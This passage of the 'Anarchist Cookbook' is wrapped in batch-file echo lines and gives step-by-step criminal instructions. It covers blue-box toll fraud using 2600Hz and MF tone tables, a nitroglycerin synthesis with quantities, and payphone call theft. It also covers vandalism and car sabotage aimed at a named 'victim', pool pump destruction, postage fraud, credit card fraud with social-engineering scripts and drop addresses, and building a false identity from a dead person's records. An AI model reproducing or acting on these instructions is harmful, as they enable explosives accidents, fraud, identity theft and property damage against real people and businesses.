echo this is true for my area, but were pretty sure that the same idea is implemented across the country.
echo Now that you know how to access a trunk line or as operators say a loop, I will tell you the many things you can do with it. Here is a list of 
echo ATandT services accessible to you by using a blue box.
echo A/C+101 TOLL SWITCHING
echo A/C+121 INWARD OPERATOR
echo A/C+131 INFORMATION
echo A/C+141 ROUTE and RATE OP.
echo A/C+11501 MOBILE OPERATOR
echo A/C+11521 MOBILE OPERATOR
echo Starting conferences:
echo This is one the most useful attributes of blue boxing. Now the confs. are up 24 hours/day and 7 days/week and the billing lines are being billed. 
echo Since I believe the above is true (about the billing lines being billed) I would recommend that you never let your number show up on the conf. If 
echo you started it, put it on a loop and then call the loop. Enough bullshit To start the conf. Dial one of these three numbers in m-f while you are on 
echo the trunk.
echo 213+080+XXXX
echo XXXX=1050,3050
echo SPECIAL XXXX=1000,1100,1200,1500,2200,2500.
echo These numbers are in LA and are the most watched, I do not advise using this
echo NPA.
echo 312+001+1050 OR 3050
echo 914+042+1050 OR 1100,1200 ECT..
echo I believe only 914 works at the moment.
echo Once connected with one of these you will either hear a re-order, busy, or chirp. When you hear the chirp enter the billing line in M-F. I use the 
echo conf. dial- up. A billing line example: kp312+001+1050st you will then hear two tutes and a recording asking you for the number of conferees 
echo including yourself. Enter a number between 20 and 30. If you ever get over 30 people on a conference all you will hear is jumbled voices. 
echo After the it says "your conference size is xx" then hit the pound (#) sign. Add your favorite loop on and hit 6 to transfer control to it. After it 
echo says control will be transferred hang up and call the other side of the loop, hit the pound sign (#) and follow the instructions. A bonus for conf. 
echo is to add an international number dial 1+011+cc+number pretty cool ehhh. A few extra notes. Do not add numbers that you will want to hang 
echo up, add these through MCI or Sprint. You cannot blow anyone off with 2600hz unless they are in an old x-bar or older system. Many DA 
echo operators will stay on after you abuse them; you may have to start another or at least don't say any numbers. Never add the tone side of a 
echo loop onto a conf. never add more than one MCI node on your conf.
echo Route and rate:
echo Note route and rate and RQS perform the same service. RandR simply tells you route and rate info which is very valuable, ex. Such as the inward 
echo routing for an exchange in an area code. An inward routing will let you call her and she can do an emergency interrupt for you. She can tell 
echo you how to get international operators, ect. Here are the terms you are required to use:
echo International,
echo -Operator route for [country, city]. -gives you inward op.
echo -Directory route for [country, city]. -gives you directory ass.
echo -City route for [country, city]. -gives you country and city code.
echo Operator route for [a/c]+ [exchange] -gives you inward op. Route
echo Ex. [a/c]+ or [a/c]+0xx+ when she says plus she means plus 121.
echo Numbers route for [state, city] -gives you a/c.
echo Place name [a/c]+[exchange] -gives you city/state for that a/c and
echo Exchange.
echo International calls:
echo To call international over cable simply access a trunk and dial kp011xxxst wait for sender tone, kpxxxcc-numberst xxx - a 3 digit country code, 
echo it may not be 3 digits so just put 1 or 2 0's in front of it. Cc - is the city code to go by satellite:

echo 77. Blue Box by The Jolly Roger
echo To quote Karl Marx, blue boxing has always been the most noble form of phreaking. As opposed to such things as using an MCI code to make 
echo a free fone call, which is merely mindless pseudo-phreaking, blue boxing is actual interaction with the Bell System toll network. It is likewise 
echo advisable to be more cautious when blue boxing, but the careful phreak will not be caught, regardless of what type of switching system he is 
echo under. In this part, I will explain how and why blue boxing works, as well as where. In later parts, I will give more practical information for blue 
echo boxing and routing information. To begin with, blue boxing is simply communicating with trunks. Trunks must not be confused with subscriber 
echo lines 'or "customer loops"' which are standard telefone lines. Trunks are those lines that connect central offices. Now, when trunks are not in 
echo use 'i.e., idle or "on-hook" state' they have 2600Hz applied to them. If they are two-way trunks, there is 2600Hz in both directions. When a 
echo trunk IS in use 'busy or "off-hook" state', the 2600Hz is removed from the side that is off-hook. The 2600Hz is therefore known as a 
echo supervisory signal, because it indicates the status of a trunk; on hook 'tone' or off-hook 'no tone'. Note also that 2600Hz denoted SF 'single 
echo frequency' signaling and is "in-band." This is very important. "In-band" means that is within the band of frequencies that may be transmitted 
echo over normal telefone lines. Other SF signals, such as 3700Hz are used also. However, they cannot be carried over the telefone network 
echo normally 'they are "out-of-band" and are therefore not able to be taken advantage of as 2600Hz is. Back to trunks. Let's take a hypothetical 
echo phone call. You pick up your fone and dial 1+806-258-1234 'your good friend in Amarillo, Texas'. For ease, we'll assume that you are on #5 
echo Crossbar switching and not in the 806 area. Your central office 'CO' would recognize that 806 is a foreign NPA, so it would route the call to 
echo the toll center that serves you. [For the sake of accuracy here, and for the more experienced readers, note that the CO in question is a class 5 
echo with LAMA that uses out-of-band SF supervisory signaling]. Depending on where you are in the country, the call would leave your toll center 
echo 'on more trunks' to another toll center, or office of higher "rank". Then it would be routed to central office 806-258 eventually and the call 
echo would be completed. 
echo  Illustration
echo 'A---CO1-------TC1------TC2----CO2----B'
echo 'A.... you'
echo 'CO1.. your central office'
echo 'TC1.. your toll office.'
echo 'TC2.. toll office in Amarillo.'
echo 'CO2.. 806-258 central office.'
echo 'B.... your friend '806-258-1234''
echo In this situation it would be realistic to say that CO2 uses SF in-band '2600Hz' signaling, while all the others use out-of-band signaling 
echo '3700Hz'. If you don't understand this, don't worry. I am pointing this out merely for the sake of accuracy. The point is that while you are 
echo connected to 806-258-1234, all those trunks from YOUR central office 'CO1' to the 806-258 central office 'CO2' do *NOT* have 2600Hz on 
echo them, indicating to the Bell equipment that a call is in progress and the trunks are in use. Now let's say you're tired of talking to your friend in 
echo Amarillo, so you send a 2600Hz down the line. This tone travels down the line to your friend's central office 'CO2' where it is detected. 
echo However, that CO thinks that the 2600Hz is originating from Bell equipment, indicating to it that you've hung up, and thus the trunks are once 
echo again idle 'with 2600Hz present on them'. But actually, you have not hung up, you have fooled the equipment at your friend's CO into thinking 
echo you have. Thus, it disconnects him and resets the equipment to prepare for the next call. All this happens very quickly '300-800ms for step-bystep equipment and 150-400ms for other equipment'. When you stop sending 2600Hz 'after about a second', the equipment thinks that another 
echo call is coming towards --> on hook, no tone -->off hook. Now that you've stopped sending 2600Hz, several things happen:
echo 1.A trunk is seized.
echo 2.A "wink" is sent to the CALLING end from the CALLED end indicating that the CALLED end 'trunk' is not ready to receive digits yet.
echo 3.A register is found and attached to the CALLED end of the trunk within about two seconds 'max'.
echo 4.A start-dial signal is sent to the CALLING end from the CALLED end indicating that the CALLED end is ready to receive digits. Now, all of this 
echo is pretty much transparent to the blue boxer. All he really hears when these four things happen is a <beep><kerchunk>. So, seizure of a 
echo trunk would go something like this:
echo 1.Send a 2600Hz
echo 2.Terminate 2600Hz after 1-2 secs.
echo 3.[beep][kerchunk]
echo Once this happens, you are connected to a tandem that is ready to obey your every command. The next step is to send signaling information in 
echo order to place your call. For this you must simulate the signaling used by operators and automatic toll-dialing equipment for use on trunks. There 
echo are mainly two systems, DP and MF. However, DP went out with the dinosaurs, so I'll only discuss MF signaling. MF 'multi-frequency' signaling 
echo is the signaling used by the majority of the inter- and intra-lata network. It is also used in international dialing known as the CCITT No« system. 
echo MF signals consist of 7 frequencies, beginning with 700Hz and separated by 200Hz. A different set of two of the 7 frequencies represent the 
echo digits 0 thru 9, plus an additional 5 special keys. The frequencies and uses are as follows:
echo Frequencies'Hz' Domestic International
echo 700+900 1 1
echo 700+1100 2 2
echo 900+1100 3 3
echo 700+1300 4 4
echo 900+1300 5 5
echo 1100+1300 6 6
echo 700+1500 7 7
echo 900+1500 8 8
echo 1100+1500 9 9
echo 1300+1500 0 0
echo 700+1700 ST3p Code 1
echo 900+1700 Stp Code 1
echo 1100+1700 KP KP1
echo 1300+1700 ST2p KP2
echo 1500+1700 ST ST
echo  The timing of all the MF signals is a nominal 60ms, except for KP, which should have a duration of 100ms. There should also be a 60ms silent 
echo period between digits. This is very flexible however, and most Bell equipment will accept outrageous timings. In addition to the standard uses 
echo listed above, MF pulsing also has expanded usages known as "expanded inband signaling" that include such things as coin collect, coin return, 
echo ringback, operator attached, and operator attached, and operator released. KP2, code 11, and code 12 and the ST_ps 'STart "primes" all have 
echo special uses which will be mentioned only briefly here. To complete a call using a blue box once seizure of a trunk has been accomplished by 
echo sending 2600Hz and pausing for the <beep><kerchunk>, one must first send a KP. This readies the register for the digits that follow. For a 
echo standard domestic call, the KP would be followed by either 7 digits 'if the call were in the same NPA as the seized trunk' or 10 digits 'if the call 
echo were not in the same NPA as the seized trunk'. [Exactly like dialing normal fone call]. Following either the KP and 7 or 10 digits, a STart is sent 
echo to signify that no more digits follow. Example of a complete call:
echo 1.Dial 1-806-258-1234
echo 2.Wait for a call-progress indication 'such as ring,busy,recording,etc.'
echo 3.Send 2600Hz for about 1 second.
echo 4.Wait for about ll-progress indication 'such as ring,busy,recording,etc.'
echo 5.Send KP+305+994+9966+ST
echo The call will then connect if everything was done properly. Note that if a call to an 806 number were being placed in the same situation, the are 
echo code would be omitted and only KP + seven digits + ST would be sent. Code 11 and code 12 are used in international calling to request certain 
echo types of operators. KP2 is used in international calling to route a call other than by way of the normal route, whether for economic or equipment 
echo reasons. STp, ST2p, and ST3p 'prime, two prime, and three prime' are used in TSPS signaling to indicate calling type of call 'such as coindirect dialing.

echo 79. Nitroglycerin Recipe by The Jolly Roger
echo Like all chemists I must advise you all to take the greatest care and caution when you are doing this. Even if you have made this stuff before. 
echo This first article will give you information on making nitroglycerin, the basic ingredient in a lot of explosives such as straight dynamites, and 
echo gelatin dynamites.
echo Making nitroglycerin:
echo 1.Fill a 75-milliliter beaker to the 13 mL. Level with fuming red nitric acid, of 98% pure concentration.
echo 2.Place the beaker in an ice bath and allow to cool below room temp.
echo 3.After it has cooled, add to it three times the amount of fuming sulferic acid '99% h2so4'. In other words, add to the now -cool fuming nitric 
echo acid 39 mL. Of fuming sulferic acid. When mixing any acids, always do it slowly and carefully to avoid splattering.
echo 4.When the two are mixed, lower their temp. By adding more ice to the bath, about 10-15øC. 'Use a mercury-operated thermometer'
echo 5.When the acid solution has cooled to the desired temperature, it is ready for the glycerin. The glycerin must be added in small amounts using 
echo a medicine dropper. (Read this step about 10 times) Until the entire surface of 
echo the acid it covered with it.
echo 6.This is a dangerous point since the nitration will take place as soon as the glycerin is added. The nitration will produce heat, so the solution 
echo must be kept below 30øC This will insure that it does 
echo not go off in your face
echo 7.For the first ten minutes of nitration, the mixture should be gently stirred. In a normal reaction the nitroglycerin will form as a layer on top of 
echo the acid solution, while the sulferic acid will absorb the excess water.
echo 8.After the nitration has taken place, and the nitroglycerin has formed on the top of the solution, the entire beaker should be transferred slowly 
echo and carefully to another beaker of water. When this is done the nitroglycerin will settle at the bottom so the other acids can be drained 
echo away.
echo 9.After removing as much acid as possible without disturbing the nitroglycerin, remove the nitroglycerin with an eyedropper and place it in a 
echo bicarbonate of soda (sodium bicarbonate in case you didn't know) solution. The sodium is an alkali and will neutralize much of the acid 
echo remaining. This process should be repeated as much as necessary using blue litmus paper to check for the presence of acid. The 
echo remaining acid only makes the nitroglycerin more unstable than it already is.
echo 10.Finally The final step is to remove the nitroglycerin from the bicarbonate. His is done with and eye- dropper, slowly and carefully. The usual 
echo test to see if nitration has been successful is to place one drop of the nitroglycerin on metal and ignite it. If it is true nitroglycerin it will 
echo burn with a clear blue flame.
echo ** Caution **
echo Nitro is very sensitive to decomposition, heating dropping, or jarring, and may explode if left undisturbed and cool.

echo and front door. I usually start out when he goes to work...I find out what his cheap car looks like, and memorize it for future abuse...It is always 
echo fun to paint his front door (apt.) hot pink with purple polka-dots, and off-neon colors in diagonal stripes. You can also pound a few hundred or 
echo so four
echo inch nails into his front door (this looks like somebody really doesn't like you from the inside). Another great is to fill his keyhole with liquid steel 
echo so that after the bastard closes his door - the only way to get back in is to break it down. If you can spare it, leave him an axe - that is, 
echo implanted three inches into, and through the door Get a piece of wood siding that will more 
echo than cover his front door completely. Nail two by fours on the edges of the siding (all except the bottom) so you have a barge - like contraption. 
echo Make a hole at the top that will be large enough for a cement slide. Mix about six or seven LARGE bags of QUICK drying cement. Use the 
echo cement slide to fill the antechamber created by the 'barge' that is around his door. Use more two by fours to brace your little cement-filled 
echo barge, and let the little gem dry. When it is, remove the 'barge' so only a stone monolith remains that covers his door. Use any remaining cement 
echo to make a base around this so he can't just push it over. When I did this, he called the fire department, and they thought he meant wood, so 
echo they brought axes. I watched with a few dozen or so other tenants, and laughed my damn ass off After he parks his car 
echo for the night, the fun really begins...I start out by opening up the car by jamming a very thin, but loack - inside and out Then proceed to put 
echo orange-juice syrup all over the seats, so after he gets through all the other shit that you do, he will have the stickiest
echo seats in the world. You can then get a few Sunday papers, and crack one of the windows about four inches. Lightly crumple the papers, and 
echo continue to completely fill the inside of his car with the newspapers. A copy of the Sunday New York Times will nicely fill a Volkswagen What 
echo is also quite amusing is to put his car on cinder blocks, slash his tires at the top, and fill them with cement Leave the cinder blocks there so 
echo that, after he knocks the car off of them, he will get about 3 miles to the gallon with those tires, and do 0 to 60 in about two minutes It is even 
echo more hilarious when he doesn't know why the hell why Another is to open his hood, and then run a few wires from the sparkplugs to the 
echo METAL body. The sure is one HOT car when it is running Now, I like to pour two pounds of sugar down his gas tank. If this doesn't blow every 
echo gasket in his engine it will do something called 'caramelizing his engine'. This is when the extreme heat turns the sugar to caramel, and you 
echo literally must completely take the engine out and apart, and clean each and every individual part Well, if this asshole does not get the message, 
echo you had better start to get serious. If this guide was used properly and as it was intended (no, not as kindling for the fire), this asshole will either 
echo move far away, seek professional psychological help, commit suicide, or all of the above

echo 81. Stealing calls from payphones by The Jolly Roger
echo Now to make free local calls, you need a finishing nail. I highly recommend "6D E.G. FINISH C/H, 2 INCH" nails. These are about 3/32 of an inch 
echo in diameter and 2 inches long (of course). You also need a large size paper clip. By large I mean they are about 2in long (FOLDED). Then you 
echo unfold the paper clip. Unfold it by taking each piece and moving it out 90ø. When it is done it should look somewhat like this:
echo  /----------\
echo  : :
echo  : :
echo  : :
echo  : :
echo  \-----
echo Now, on to the neat stuff. What you do, instead of unscrewing the glued-on mouthpiece, is insert the nail into the center hole of the 
echo mouthpiece (where you talk) and push it in with pressure or just hammer it in by hitting the nail on something. Just DON'T KILL THE 
echo MOUTHPIECE You could damage it if you insert the nail too far or at some weird angle. If this happens then the other party won't be able 
echo to hear what you say. You now have a hole in the mouthpiece in which you can easily insert the paper clip. So, take out the nail and put in the 
echo paper clip. Then take the other end of the paper clip and shove it under the rubber cord protector at the bottom of the handset (you know, the 
echo blue guy...). This should end up looking remotely like...like this:
echo  /----------\ Mouthpiece
echo  : :
echo  Paper clip --> : : /
echo  : /---:---\
echo  : : :
echo  :------------>
echo  ====================\---))):
echo  : To earpiece ->
echo  ^ ^
echo  \-------------------->
echo  : :
echo  : :
echo  Cord Blue guy
echo (The paper clip is shoved under the blue guy to make a good connection between the inside of the mouthpiece and the metal cord.) Now, dial 
echo the number of a local number you wish to call, sayyyy, MCI. If everything goes okay, it should ring and not answer with the "The Call You 
echo Have Made Requires a 20 Cent Deposit" recording. After the other end answers the phone, remove the paper clip. It's all that simple, see? 
echo There are a couple problems, however. One is, as I mentioned earlier, the mouthpiece not working after you punch it. If this happens to 
echo you, simply move on to the next payphone. The one you are now on is lost. Another problem is that the touch tones won't work when the 
echo paper clip is in the mouthpiece. There are two ways around this..
echo 1.Dial the first 6 numbers. This should be done without the paper clip making the connection, i.e., one side should not be connected. Then 
echo connect the paper clip, hold down the last digit, and slowly pull the paper clip out at the mouthpiece's end.
echo 2.Don't use the paper clip at all. Keep the nail in after you punch it. Dial the first 6 digits. Before dialing the last digit, touch the nail head to 
echo the plate on the main body of the phone, the money safe thingy..then press the last number. The reason that this method is sometimes 
echo called clear boxing is because there is another type of phone which lets you actually make the call and listen to them say "Hello, 
echo hello?" but it cuts off the mouthpiece so they can't hear you. The Clear Box is used on that to amplify your voice signals and send it 
echo through the earpiece. If you see how this is even slightly similar to the method I have just described up there, kindly explain it to ME 
echo Cause I don't GET IT Anyways, this DOES work on almost all single slot, Dial Tone First payphones (Pacific Bell for sure). I do it all the 
echo time. This is the least, I STRESS *LEAST*, risky form of Phreaking.

echo 82. Pool Fun by The Jolly Roger
echo First of all, you need know nothing about pools. The only thing you need know is what a pool filter looks like. If you don't know that. Second, 
echo dress casual. Preferably, in black. Visit your "friends" house, the one whose pool looks like fun Then you reverse the polarity of his/her pool, 
echo by switching the wires around. They are located in the back of the pump. This will have quite an effect when the pump goes on. In other 
echo words. Boooooooooooommm That's right, when you mix + wires with - plugs, and vice- versa, the 4th of July happens again. Not into total 
echo destruction??? When the pump is off, switch the pump to "backwash". Turn the pump on and get the phuck out When you look the next day, 
echo phunny. The pool is dry. If you want permanent damage, yet no great display like my first one mentioned, shut the valves of the pool off. 
echo (There are usually 2) One that goes to the main drain and one that goes to the filter in the pool. That should be enough to have one dead 
echo pump. The pump must take in water, so when there isn't any... Practical jokes: these next ones deal with true friends and
echo there is *no* permanent damage done. If you have a pool, you must check the pool with chemicals. There is one labeled orthotolidine. The 
echo other is labeled alkaline (pH). You want orthotolidine. (It checks the chlorine). Go to your local pool store and tell them you're going into the pool 
echo business, and to sell you orthotolidine (a CL detector) Buy this in great quantities if possible. The solution is clear. You fill 2 baggies with this 
echo chemical. And sew the bags to the inside of your suit. Next, go swimming with your friend Then open the bags and look like you're enjoying a 
echo piss. And anyone there will turn a deep red Explain what it is, then 
echo add vinegar to the pool. Only a little. The "piss" disappears.

echo 83. Free Postage by The Jolly Roger
echo The increasing cost of postage to mail letters and packages is bringing down our standard of living. To remedy this deplorable situation, some 
echo counter control measures can be applied. For example, if the stamps on a letter are coated with Elmer's Glue by the sender, the cancellation 
echo mark will not destroy the stamp: the Elmer's drives to form an almost invisible coating that protects the stamps from the cancellation ink. Later, 
echo the receiver of the letter can remove the cancellation mark with water and reuse the stamps. Furthermore, ecological saving will also result 
echo from recycling the stamps. Help save a tree. The glue is most efficiently applied with a brush with stiff, short bristles. Just dip the brush directly 
echo into the glue and spread it on evenly, covering the entire surface of the stamp. It will dry in about 15 minutes. For mailing packages, just follow 
echo the same procedure as outlined above; however, the package should be weighed and checked to make sure that it has the correct amount of 
echo postage on it before it is taken to the Post Office. Removing the cancellation and the glue from the stamps can be easily accomplished by 
echo soaking the stamps in warm water until they float free from the paper. The stamps can then be put onto a paper towel to dry. Processing 
echo stamps in large batches saves time too. Also, it may be helpful to write the word 'Elmer' at the top of the letter (not on the envelope) to cue the 
echo receiving party in that the stamps have been protected with the glue. We all know that mailing packages can be expensive. And we also know 
echo that the handicapped are sometimes discriminated against in jobs. The Government, being the generous people they are, have given the blind 
echo free postal service. Simply address you envelope as usual, and make one modification. In the corner where the stamp would go, write in (or 
echo stamp) the words 'FREE MATTER FOR THE BLIND". Then drop you package or letter in one of the blue federal mailboxes. DO NOT TAKE THE 
echo LETTER TO THE POST OFFICE, OR LEAVE IT IN YOUR MAILBOX. Sounds very nice of the government to do this, right? Well, they aren't that 
echo nice. The parcel is sent library rate, that is below third class. It may take four to five days to send a letter to just the next town. This too is quite 
echo simple, but less effective. Put the address that you are sending the letter to as the return address. If you were sending a $20 donation to the 
echo pirate's Chest, you would put our address (PO box 644, Lincoln MA 01773) as the return address. Then you would have to be careless and 
echo forget to put the stamp on the envelope. A nice touch is to put a bullshit address in the center of the envelope. Again, you MUST drop the letter 
echo in a FEDERAL mailbox. If the post office doesn't send the letter to the return address for having no stamp, they will send it back for the reason 
echo of "No such address".
echo Example:
echo Pirates Chest Dept. 40DD
echo P.O. Box 644865
echo Lincol, Ma. 41773
echo Tom Bullshit
echo 20 Fake Road
echo What Ever, XX 99851
echo One last thing you might try doing is soaking a canceled stamp off of an envelope, and gluing it onto one you are sending. Then burn the stamp, 
echo leaving a little bit to show that there was one there.

echo 86. The Art of Carding by The Jolly Roger
echo Obtaining a credit card number: There are many ways to obtain the information needed to card something. The most important things needed 
echo are the card number and the expiration date. Having the card-holders name doesn't hurt, but it is not essential. The absolute best way to obtain 
echo all the information needed is by trashing. The way this is done is simple. You walk around your area or any other area and find a store, mall, 
echo supermarket, etc., that throws their garbage outside on the sidewalk or dumpster. Rip the bag open and see if you can find any carbons at all. 
echo If you find little shreds of credit card carbons, then it is most likely not worth your time to tape together. Find a store that does not rip their 
echo carbons at all or only in half. Another way is to bullshit the number out of someone. That is call them up and say "Hello, this is Visa security 
echo and we have a report that your card was stolen." They will deny it and you will try to get it out of them from that point on. You could say, "It 
echo wasn't stolen? Well what is the expiration date and maybe we can fix the problem.... OK and what is the number on your card?......Thank you 
echo very much and have a nice day." Or think of something to that degree. Another way to get card numbers is through systems such as TRW 
echo and CBI, this is the hard way, and probably not worth the trouble, unless you are an expert on the system. Using credit card numbers posted 
echo on BBS's is risky. The only advantage is that there is a good chance that other people will use it, thus decreasing the chances of being the 
echo sole-offender. The last method of getting numbers is very good also. In most video rental stores, they take down your credit card number 
echo when you join to back-up your rentals. So if you could manage to steal the list or make a copy of it, then you are set for a LONG time. 
echo Choosing a victim: Once you have the card number, it is time to make the order. The type of places that are easiest to victimize are small 
echo businesses that do mail order or even local stores that deliver. If you have an ad for a place with something you want and the order number is 
echo NOT a 1-800 number then chances are better that you will succeed. 
echo Ordering
echo When you call the place up to make the order, you must have several things readily at hand. These are the things you will need: A name, 
echo telephone number, business phone, card number (4 digit bank code if the card is MasterCard), expiration date, and a complete shipping and 
echo billing address. I will talk about all of these in detail. A personal tip: When I call to make an order, it usually goes much smoother if the person 
echo you are talking to is a woman. In many cases they are more gullible than men. The name: You could use the name on the card or the name of 
echo the person who you are going to send the merchandise to. Or you could use the name on the card and have it shipped to the person who 
echo lives at the drop (Say it is a gift or something). The name is really not that important because when the company verifies the card, the persons 
echo name is never mentioned, EXCEPT when you have a Preferred Visa card. Then the name is mentioned. You can tell if you have a Preferred 
echo Visa card by the PV to the right of the expiration date on the carbon. No phone all day long waiting for the company to call (Which they will), 
echo then the phone number to give them as your home-phone could be one of the following: A number that is ALWAYS busy, a number that 
echo ALWAYS rings, a payphone number, low end of a loop (and you will wait on the other end), or a popular BBS. NEVER give them your home 
echo phone because they will find out as soon as the investigation starts who the phone belongs to. The best thing would be to have a payphone 
echo call forward your house (via Cosm The business number.) When asked for, repeat the number you used for your home phone. Card number: 
echo The cards you will use will be Visa, Mastercard, and American Express. The best is by far Visa. It is the most straight-forward. Mastercard 
echo is pretty cool except for the bank code. When they ask for the bank code, they sometimes also ask for the bank that issued it. When they ask 
echo that just say the biggest bank you know of in your area. Try to avoid American Express. They tend to lead full scale investigations. 
echo Unfortunately, American Express is the most popular card out. When telling the person who is taking your call the card number, say it slow, 
echo clear, and with confidence. e.g. CC# is 5217-1234-5678-9012. Pause after each set of four so you don't have to repeat it. Expiration date: The 
echo date must be at LEAST in that month. It is best to with more than three months to go. The address: More commonly referred to as the 'drop'. 
echo Well the drop can range from an abandoned building to your next door neighbors apartment. If you plan to send it to an apartment building then 
echo be sure NOT to include an apartment number. This will confuse UPS or postage men a little and they will leave the package in the lobby. Here is 
echo a list of various drops: The house next door whose family is on vacation, the apartment that was just moved out of, the old church that will be 
echo knocked down in six months, your friends house who has absolutely nothing to do with the type of merchandise you will buy and who will 
echo also not crack under heat from feds, etc.. There are also services that hold merchandise for you, but personally I would not trust them. And 
echo forget about P.O. Boxes because you need ID to get one and most places don't ship to them anyway. Other aspects of carding: Verifying 
echo cards, seeing if they were reported stolen. Verifying cards: Stores need to verify credit cards when someone purchases something with one. 
echo They call up a service that checks to see if the customer has the money in the bank. The merchant identifies himself with a merchant number. 
echo The service then holds the money that the merchant verified on reserve. When the merchant sends in the credit card form, the service sends 
echo the merchant the money. The service holds the money for three days and if no form appears then it is put back into the bank. The point is that 
echo if you want to verify something then you should verify it for a little amount and odds are that there will be more in the bank. The good thing 
echo about verification is that if the card doesn't exist or if it is stolen then the service will tell you. To verify MasterCard and Visa try this number. It 
echo is voice: 1-800-327-1111 merchant code is 596719. Stolen cards: Mastercard and Visa come out with a small catalog every
echo week where they publish EVERY stolen or fraudulently used card. I get this every week by trashing the same place on the same day. If you 
echo ever find it trashing then try to get it every week. Identifying cards: Visa card numbers begin with a 4 and have either 13 or 16 digits. 
echo MasterCard card numbers begin with a 5 and have 16 digits. American Express begins with a 3 and has 15 digits. They all have the formats of 
echo the following:
echo 3xxx-xxxxxx-xxxxx American Express
echo 4xxx-xxx-xxx-xxx Visa
echo 4xxx-xxxx-xxxx-xxxx Visa
echo 5xxx-xxxx-xxxx-xxxx MasterCard
echo Gold cards: A gold card simply means that credit is good for $5000. Without a gold card, credit would be normally $2000. To recognize a gold 
echo card on a carbon there are several techniques:
echo American Express-none.
echo Visa-PV instead of CV.
echo Note-When verifying a PV Visa, you have to have the real name of the cardholder.
echo Mastercard-An asterisk can signify a gold card, but this changes depending when the card was issued. I am going to type out a dialog 
echo between a carder and the phone operator to help you get the idea.
echo Operator: "Over-priced Computer Goods, may I help you?"
echo Carder: "Hi, I would like to place an order please."
echo Operator: "Sure, what would you like to order?"
echo Carder: "400 generic disks and a double density drive."
echo Operator: "Ok, is there anything else?"
echo Carder: "No thank you, that's all for today."
echo Operator: "Ok, how would you like to pay for this? MasterCard or Visa?"
echo Carder: "Visa."
echo Operator: "And your name is?"
echo Carder: "Lenny Lipshitz." (Name on card)
echo Operator: "And your Visa card number is?"
echo Carder: "4240-419-001-340" (Invalid card)
echo Operator: "Expiration date?"
echo Carder: "06-92."
echo Operator: "And where would you like the package shipped to?"
echo Carder: "6732 Goatsgate Port. Paris, Texas, 010166."
echo Operator: "And what is your home telephone number?"
echo Carder: "212-724-9970" (This number is actually always busy)
echo Operator: "I will also need your business phone number in case we have to reach you."
echo Carder: "You can reach me at the same number. 212-724-9970"
echo Operator: "O.K. Thank you very much and have nice day."
echo Carder: "Excuse me, when will the package arrive?"
echo Operator: "In six to seven days UPS."
echo Carder: "Thanks a lot, and have a pleasant day."
echo Now you wait 6-7 days when the package will arrive to the address which is really a house up for sale. There will be a note on the door 
echo saying, "Hello UPS, please leave all packages for Lenny Lipshitz in the lobby or porch. Thanks a lot, Lenny Lipshitz" (Make the signature halfway convincing)

echo 88. How To Create A New Identity by The Walking Glitch
echo You might be saying, "Hey Glitch, what do I need a new identity for?" The answer is simple. You might want to go buy liquor somewhere, 
echo right? You might want to go give the cops the false name when you get busted so you keep your good name, eh? You might even want to use 
echo the new identity for getting a P.O. Box for carding. Sure You might even want the stuff for renting yourself a VCR at some dickless loser of a 
echo convenience store. Here we go: Getting a new ID isn't always easy, no one said it would be. By following these steps, any bozo can become 
echo a new bozo in a couple of weeks.
echo STEP 1
echo The first step is to find out who exactly you'll become. The most secure way is to use someone's ID who doesn't use it themselves. The people 
echo who fit that bill the best are dead. As an added bonus they don't go complaining one bit. Go to the library and look through old death notices. 
echo You have to find someone who was born about the same time as you were, or better yet, a year or two older so you can buy booze, etc. You 
echo should go back as far as you can for the death because most states now cross index deaths to births so people can't do this in the future. The 
echo cutoff date in Wisconsin is 1979, folks in this grand state gotta look in 1978 or earlier. Anything earlier there is cool. Now, this is the hardest 
echo part if you're younger. Brats that young happen to be quite resilient, taking falls out of three story windows and eating rat poison like its Easter 
echo candy, and not a scratch or dent. There ain't many that die, so ya gotta look your ass off. Go down to the library and look up all the death 
echo notices you can, if it's on microfilm so much the better. You might have to go through months of death notices though, but the results are well 
echo worth it. You gotta get someone who died locally in most instances: the death certificate is filed only in the county of death. Now you go down 
echo to the county courthouse in the county where he died and get the death certificate, this will cost you around $3-$5 depending on the state 
echo you're in. Look at this hunk of paper, it could be your way to vanish in a cloud of smoke when the right time comes, like right after that big 
echo scam. If You're lucky, the slobs parents signed him up with social security when he was a snot nosed brat. That'll be another piece of ID you 
echo can get. If not, that's Ok too. It'll be listed on the death certificate if he has one. If you're lucky, the stiff was born locally and you can get his 
echo birth certificate right away.
echo STEP 2
echo Now check the place of birth on the death certificate, if it's in the same place you standing now you're all set. If not, you can mail away for one 
echo from that county but its a minor pain and it might take a while to get, the librarian at the desk has listings of where to write for this stuff and 
echo exactly how much it costs. Get the Birth certificate, its worth the extra money to get it certified because that's the only way some people will 
echo accept it for ID. When you're getting this stuff the little forms ask for the reason you want it, instead of writing in "Fuck you", try putting in the 
echo word "Genealogy". They get this all the time. If the Death certificate looks good for you, wait a day or so before getting the certified birth 
echo certificate in case they recognize someone wanting it for a dead guy.
echo STEP 3
echo Now your cooking You got your start and the next part's easy. Crank out your old Dot matrix printer and run off some mailing labels addressed 
echo to you at some phony address. Take the time to check your phony address that there is such a place. Hotels that rent by the month or large 
echo apartment buildings are good, be sure to get the right zip code for the area. These are things that the cops might notice that will trip you up. 
echo Grab some old junk mail and paste your new labels on them. Now take them along with the birth certificate down to the library.
echo Get a new library card. If they ask you if you had one before say that you really aren't sure because your family moved around a lot when you 
echo were a kid. Most libraries will allow you to use letters as a form of ID when you get your card. If they want more give them a sob story about 
echo how you were mugged and got your wallet stolen with all your identification. Your card should be waiting for you in about two weeks. Most 
echo libraries ask for two forms of ID, one can be your trusty Birth Certificate, and they do allow letters addressed to you as a second
echo form.
echo STEP 4
echo Now you got a start, it isn't perfect yet, so let's continue. You should have two forms of ID now. Throw away the old letters, or better yet stuff 
echo them inside the wallet you intend to use with this stuff. Go to the county courthouse and show them what nice ID you got and get a state ID 
echo card. Now you got a picture ID. This will take about two weeks and cost about $5, its well worth it.
echo STEP 5
echo If the death certificate had a social security number on it you can go out and buy one of those metal SS# cards that they sell. If it didn't, then 
echo you got all kinds of pretty ID that shows exactly who you are. If you don't yet have an SS#, Go down and apply for one, these are free but 
echo they could take five or six weeks to get, Bureaucrats you know... You can invent a SS# too if you like, but the motto of 'THE WALKING GLITCH' 
echo has always been "Why not excellence?".
echo STEP 6
echo If you want to go whole hog you can now get a bank account in your new name. If you plan to do a lot of traveling then you can put a lot of 
echo money in the account and then say you lost the account book. After you get the new book you take out all the cash. They'll hit you with a slight 
echo charge and maybe tie-up your money some, but if you're ever broke in some small town that bank book will keep you from being thrown in jail 
echo as a vagrant.
echo ALL DONE?
